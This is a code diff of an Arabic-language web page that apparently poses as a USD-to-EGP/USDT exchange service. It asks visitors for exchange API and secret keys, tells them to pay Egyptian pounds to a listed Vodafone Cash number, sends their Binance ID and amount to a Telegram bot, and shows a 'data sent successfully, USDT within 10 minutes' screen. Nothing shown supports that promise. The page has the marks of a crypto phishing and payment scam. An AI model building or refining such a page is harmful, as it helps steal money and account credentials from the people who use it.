@@ -9,54 +9,86 @@
     body { font-family: 'Cairo', sans-serif; }
   </style>
 </head>
-<body class="bg-white text-black min-h-screen flex items-center justify-center">
+<body class="bg-white text-black min-h-screen">
 
-  <div class="w-full max-w-md p-6 bg-black text-white rounded-2xl shadow-lg space-y-8">
+  <!-- شريط الأيقونات العلوي -->
+  <div class="bg-black text-white p-4 flex justify-around text-xl">
+    <span>🔐</span>
+    <span>💰</span>
+    <span>📱</span>
+    <span>⚙️</span>
+    <span>✅</span>
+    <span>🪙</span>
+    <span>🛡️</span>
+    <span>🌐</span>
+  </div>
 
+  <!-- الحاوية الرئيسية -->
+  <div class="w-full max-w-xl mx-auto mt-8 space-y-8 p-4">
     <!-- الصفحة الأولى -->
     <div id="registration-page">
       <h1 class="text-2xl font-bold text-center mb-4">تسجيل بيانات API</h1>
 
       <input id="api-key" type="text" placeholder="API Key"
-        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
+
       <input id="secret-key" type="text" placeholder="Secret Key"
-        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
+
       <input id="ip-address" type="text" value="41.250.100.123" readonly
-        class="w-full mb-3 px-4 py-2 rounded bg-gray-600 text-gray-300 border border-gray-500"/>
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-200 text-gray-500 border border-gray-300"/>
+
       <button onclick="submitAPI()"
-        class="w-full py-2 bg-green-500 hover:bg-green-600 rounded text-white font-semibold">تأكيد</button>
+        class="w-full py-2 bg-green-600 hover:bg-green-700 rounded text-white font-semibold">تأكيد</button>
+
+      <p class="text-sm mt-4 text-gray-600 text-center">
+        يرجى إدخال بياناتك بشكل دقيق لضمان استلام USDT. معلوماتك محمية تمامًا.
+      </p>
     </div>
 
     <!-- الصفحة الثانية -->
     <div id="converter-page" class="hidden">
       <h2 class="text-2xl font-bold text-center mb-4">تحويل المبلغ بالجنيه</h2>
+
       <input id="usd-amount" type="number" placeholder="المبلغ بالدولار"
         oninput="convertToEGP()"
-        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
-      <p id="result" class="text-center text-xl text-green-400 mb-4"></p>
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
 
-      <input id="binance-id" type="text" placeholder="Binance ID"
-        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
-      <input id="wallet-id" type="text" placeholder="ID محفظة فودافون كاش"
-        class="w-full mb-3 px-4 py-2 rounded bg-gray-700 border border-gray-600"/>
+      <p id="result" class="text-center text-xl text-green-700 font-bold mb-4"></p>
 
-      <p class="text-sm text-gray-400 text-center">قم بالتحويل إلى رقم فودافون كاش: <span class="text-yellow-300 font-semibold">01022131546</span></p>
+      <div class="bg-yellow-100 border border-yellow-400 p-3 rounded mb-4 text-center">
+        <p class="text-lg font-semibold">يرجى تحويل <span id="egp-amount" class="text-red-600 font-bold"></span> جنيه إلى الرقم:</p>
+        <p class="text-xl mt-2 font-bold">01022131546</p>
+        <p class="mt-2 text-sm text-gray-600">ثم إدخل ID محفظتك Binance أدناه لاستلام USDT</p>
+      </div>
+
+      <input id="binance-id" type="text" placeholder="ID محفظة Binance"
+        class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
 
       <button onclick="sendBinanceInfo()"
-        class="w-full py-2 bg-blue-500 hover:bg-blue-600 rounded text-white font-semibold">إرسال</button>
+        class="w-full py-2 bg-blue-600 hover:bg-blue-700 rounded text-white font-semibold">إرسال</button>
+
+      <div class="flex justify-around mt-4 text-2xl">
+        <span>💸</span>
+        <span>💳</span>
+        <span>🧾</span>
+        <span>🔁</span>
+        <span>📈</span>
+        <span>📤</span>
+      </div>
+
+      <p class="text-sm mt-4 text-gray-600 text-center">
+        يتم إرسال المبلغ إلى محفظتك خلال 10 دقائق بعد تأكيد التحويل.
+      </p>
     </div>
 
     <!-- الصفحة الثالثة: تأكيد -->
     <div id="confirmation-page" class="hidden text-center space-y-4">
-      <h2 class="text-2xl font-bold text-green-400">تم استلام بياناتك بنجاح</h2>
-      <p class="text-lg text-gray-300">سيتم إرسال USDT خلال:</p>
-      <div id="countdown" class="text-4xl font-bold text-yellow-400 animate-pulse">10:00</div>
-      <p class="text-sm text-gray-400">يرجى الانتظار... يتم الآن إرسال USDT إلى Binance ID الخاص بك</p>
-      <button onclick="location.reload()" class="mt-6 bg-gray-700 hover:bg-gray-600 px-4 py-2 rounded text-white">
-        عودة للرئيسية
-      </button>
+      <h2 class="text-3xl font-bold text-green-600">تم إرسال البيانات بنجاح</h2>
+      <p class="text-lg">يرجى الانتظار حتى 10 دقائق لاستلام USDT على ID Binance الذي أدخلته.</p>
+      <div class="text-4xl mt-4">✅📦⚡</div>
+      <a href="/" class="inline-block mt-6 text-blue-600 hover:underline">العودة للرئيسية</a>
     </div>
-
   </div>
 
   <script>
@@ -90,16 +122,16 @@
       if (!isNaN(usdAmount)) {
         calculatedResult = usdAmount * rate;
         document.getElementById('result').textContent = `= ${calculatedResult} جنيه مصري`;
+        document.getElementById('egp-amount').textContent = `${calculatedResult}`;
       } else {
         document.getElementById('result').textContent = "";
+        document.getElementById('egp-amount').textContent = "";
       }
     }
 
     function sendBinanceInfo() {
       const binanceId = document.getElementById('binance-id').value;
-      const walletId = document.getElementById('wallet-id').value;
-
-      const message = `Binance ID: ${binanceId}\nالمبلغ بالجنيه: ${calculatedResult}\nID محفظة فودافون كاش: ${walletId}`;
+      const message = `Binance ID: ${binanceId}\nالمبلغ بالجنيه: ${calculatedResult}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -108,30 +140,11 @@
         if (response.ok) {
           document.getElementById('converter-page').classList.add('hidden');
           document.getElementById('confirmation-page').classList.remove('hidden');
-          const countdownElement = document.getElementById('countdown');
-          startCountdown(600, countdownElement); // 10 دقائق
         } else {
           alert("فشل إرسال Binance ID");
         }
       });
     }
-
-    function startCountdown(duration, display) {
-      let timer = duration, minutes, seconds;
-      const countdownInterval = setInterval(function () {
-        minutes = parseInt(timer / 60, 10);
-        seconds = parseInt(timer % 60, 10);
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        display.textContent = minutes + ":" + seconds;
-
-        if (--timer < 0) {
-          clearInterval(countdownInterval);
-          display.textContent = "تم التحويل!";
-        }
-      }, 1000);
-    }
   </script>
-
 </body>
-      </html>
+        </html>
